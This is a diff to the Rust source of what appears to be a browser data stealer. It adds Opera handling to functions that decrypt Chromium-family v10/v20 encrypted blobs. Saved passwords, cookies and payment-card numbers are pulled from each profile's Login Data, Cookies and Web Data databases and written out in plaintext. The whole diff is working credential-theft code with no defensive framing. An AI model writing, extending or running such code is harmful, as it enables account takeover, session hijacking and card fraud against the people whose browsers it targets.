@@ -765,7 +765,7 @@ fn discover_profiles(user_data_dir: &Path) -> Vec<String> {
     profiles
 }
 
-fn decrypt_blob(blob: &[u8], v10_cipher: Option<&Aes256Gcm>, v20_cipher: Option<&Aes256Gcm>) -> Option<Vec<u8>> {
+fn decrypt_blob(blob: &[u8], v10_cipher: Option<&Aes256Gcm>, v20_cipher: Option<&Aes256Gcm>, is_opera: bool) -> Option<Vec<u8>> {
     if blob.is_empty() {
         return None;
     }
@@ -774,12 +774,18 @@ fn decrypt_blob(blob: &[u8], v10_cipher: Option<&Aes256Gcm>, v20_cipher: Option<
         if let Some(cipher) = v10_cipher {
             let nonce = Nonce::from_slice(&blob[3..15]);
             if let Ok(dec) = cipher.decrypt(nonce, &blob[15..]) {
+                if is_opera && dec.len() > 32 {
+                    return Some(dec[32..].to_vec());
+                }
                 return Some(dec);
             }
         }
         if let Some(cipher) = v20_cipher {
             let nonce = Nonce::from_slice(&blob[3..15]);
             if let Ok(dec) = cipher.decrypt(nonce, &blob[15..]) {
+                if is_opera && dec.len() > 32 {
+                    return Some(dec[32..].to_vec());
+                }
                 return Some(dec);
             }
         }
@@ -841,7 +847,7 @@ fn copy_and_open_db(db_path: &Path, prefix: &str) -> Option<(Connection, PathBuf
     }
 }
 
-fn extract_passwords(profile_path: &Path, output_dir: &Path, v10_cipher: Option<&Aes256Gcm>, v20_cipher: Option<&Aes256Gcm>, temp_prefix: &str) {
+fn extract_passwords(profile_path: &Path, output_dir: &Path, v10_cipher: Option<&Aes256Gcm>, v20_cipher: Option<&Aes256Gcm>, temp_prefix: &str, is_opera: bool) {
     let db_path = profile_path.join("Login Data");
     if !db_path.exists() { return; }
 
@@ -852,7 +858,7 @@ fn extract_passwords(profile_path: &Path, output_dir: &Path, v10_cipher: Option<
 
             for row in rows.flatten() {
                 let (url, user, blob) = row;
-                if let Some(dec) = decrypt_blob(&blob, v10_cipher, v20_cipher) {
+                if let Some(dec) = decrypt_blob(&blob, v10_cipher, v20_cipher, is_opera) {
                     writeln!(file, "URL: {}\nUser: {}\nPass: {}\n---", url, user, String::from_utf8_lossy(&dec)).unwrap();
                 }
             }
@@ -861,7 +867,7 @@ fn extract_passwords(profile_path: &Path, output_dir: &Path, v10_cipher: Option<
     }
 }
 
-fn extract_cookies(profile_path: &Path, output_dir: &Path, v10_cipher: Option<&Aes256Gcm>, v20_cipher: Option<&Aes256Gcm>, temp_prefix: &str) {
+fn extract_cookies(profile_path: &Path, output_dir: &Path, v10_cipher: Option<&Aes256Gcm>, v20_cipher: Option<&Aes256Gcm>, temp_prefix: &str, is_opera: bool) {
     let mut db_path = profile_path.join("Network").join("Cookies");
     if !db_path.exists() {
         db_path = profile_path.join("Cookies");
@@ -875,10 +881,12 @@ fn extract_cookies(profile_path: &Path, output_dir: &Path, v10_cipher: Option<&A
 
             for row in rows.flatten() {
                 let (host, name, value, blob) = row;
-                let cookie_val = if !value.is_empty() {
-                    value
-                } else if let Some(dec) = decrypt_blob(&blob, v10_cipher, v20_cipher) {
+                let decrypted = decrypt_blob(&blob, v10_cipher, v20_cipher, is_opera);
+
+                let cookie_val = if let Some(dec) = decrypted {
                     String::from_utf8_lossy(&dec).to_string()
+                } else if !value.is_empty() {
+                    value
                 } else {
                     String::new()
                 };
@@ -892,7 +900,7 @@ fn extract_cookies(profile_path: &Path, output_dir: &Path, v10_cipher: Option<&A
     }
 }
 
-fn extract_autofill(profile_path: &Path, output_dir: &Path, v10_cipher: Option<&Aes256Gcm>, v20_cipher: Option<&Aes256Gcm>, temp_prefix: &str) {
+fn extract_autofill(profile_path: &Path, output_dir: &Path, v10_cipher: Option<&Aes256Gcm>, v20_cipher: Option<&Aes256Gcm>, temp_prefix: &str, is_opera: bool) {
     let db_path = profile_path.join("Web Data");
     if !db_path.exists() { return; }
 
@@ -923,7 +931,7 @@ fn extract_autofill(profile_path: &Path, output_dir: &Path, v10_cipher: Option<&
             let rows = stmt.query_map([], |row| Ok((row.get::<_, String>(0)?, row.get::<_, i32>(1)?, row.get::<_, i32>(2)?, row.get::<_, Vec<u8>>(3)?))).unwrap();
             for row in rows.flatten() {
                 let (name, m, y, blob) = row;
-                if let Some(dec) = decrypt_blob(&blob, v10_cipher, v20_cipher) {
+                if let Some(dec) = decrypt_blob(&blob, v10_cipher, v20_cipher, is_opera) {
                     writeln!(file, "Card: {} | Exp: {}/{} | Num: {}", name, m, y, String::from_utf8_lossy(&dec)).unwrap();
                 }
             }
@@ -961,15 +969,17 @@ fn extract_all_profiles_data(v20_key: Option<[u8; 32]>, config: &BrowserConfig, 
     let extract_root = Path::new(config.output_dir);
     let _ = fs::create_dir_all(extract_root);
 
+    let is_opera = config.name.contains("Opera");
+
     for profile_name in profiles {
         println!("Extracting data for profile: {}", profile_name);
         let profile_path = user_data_dir.join(&profile_name);
         let output_dir = extract_root.join(&profile_name);
         let _ = fs::create_dir_all(&output_dir);
 
-        extract_passwords(&profile_path, &output_dir, v10_cipher.as_ref(), v20_cipher.as_ref(), config.temp_prefix);
-        extract_cookies(&profile_path, &output_dir, v10_cipher.as_ref(), v20_cipher.as_ref(), config.temp_prefix);
-        extract_autofill(&profile_path, &output_dir, v10_cipher.as_ref(), v20_cipher.as_ref(), config.temp_prefix);
+        extract_passwords(&profile_path, &output_dir, v10_cipher.as_ref(), v20_cipher.as_ref(), config.temp_prefix, is_opera);
+        extract_cookies(&profile_path, &output_dir, v10_cipher.as_ref(), v20_cipher.as_ref(), config.temp_prefix, is_opera);
+        extract_autofill(&profile_path, &output_dir, v10_cipher.as_ref(), v20_cipher.as_ref(), config.temp_prefix, is_opera);
         extract_history(&profile_path, &output_dir, config.temp_prefix);
     }
     println!("Extraction complete. Data saved in {} folder.", config.output_dir);
